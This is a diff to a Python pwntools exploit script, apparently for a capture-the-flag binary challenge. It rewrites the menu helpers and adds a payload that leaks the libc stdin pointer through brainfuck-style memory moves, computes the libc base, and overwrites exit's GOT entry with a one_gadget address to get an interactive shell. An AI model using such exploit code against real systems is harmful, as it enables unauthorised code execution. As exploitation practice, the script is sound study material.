@@ -56,27 +56,40 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
-	sla(':',_add)
-	sla(':',index)
+_add,_free,_edit,_show = 2,4,3,1
+def add(size,content='a'*8):
+	sla('choice:',_add)
+	sla(':',size)
 	sa(':',content)
 
 def free(index):
-	sla(':',_free)
+	sla('choice:',_free)
 	sla(':',index)
 
-def edit(index,content):
-	sla(':',_edit)
+def edit(index,size,content):
+	sla('choice:',_edit)
 	sla(':',index)
+	sla(':',size)
 	sa(':',content)
 
-def show(index):
-	sla(':',_show)
-	sla(':',index)
+def show():
+	sla('choice:',_show)
 
 # start
+stdin = 0x602090
+star = 0x6020c0
+exit = elf.got['exit']
 
+payload = '<'*(star-stdin) + '.>.>.>.>.>.>'
+payload += '<'*(stdin+6-exit) + ',>,>,>,>,>,'
+sla(': ',payload)
+stdin = uu64(r(6))
+base = stdin - libc.sym['_IO_2_1_stdin_']
+leak('base',base)
+one = p64(base + 0xf1147)
+
+for i in range(6):
+	s(one[i])
 # end
 
 p.interactive()
